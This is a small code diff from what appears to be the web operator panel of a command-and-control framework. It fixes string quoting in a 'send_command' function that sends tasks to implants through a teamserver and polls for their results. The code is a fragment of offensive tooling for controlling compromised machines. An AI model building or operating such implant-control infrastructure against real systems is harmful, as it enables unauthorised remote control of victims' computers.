@@ -370,7 +370,7 @@ def send_command():
     hidden_value = request.form['id_implant']
     task = Take_Control.take_control_menu(hidden_value,com)
     print(task)
-    response = requests.get('http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/' + hidden_value + '/tasks/' + task)
+    response = requests.get("http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/" + hidden_value + "/tasks/" + task)
     content = response.text
     print("Content : " + content)
     time.sleep(2)
@@ -378,7 +378,7 @@ def send_command():
     # Attendre que la tâche soit terminée et récupérer le résultat
     while response.text == "task not found":
 
-            response = requests.get('http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/'+hidden_value + '/tasks/'+ task )
+            response = requests.get("http://" + const.TEAMSERVER_IP + ":" + const.TEAMSERVER_PORT + "/Implants/"+hidden_value + "/tasks/"+ task )
             print(response)
             content = response.text
             print(content)
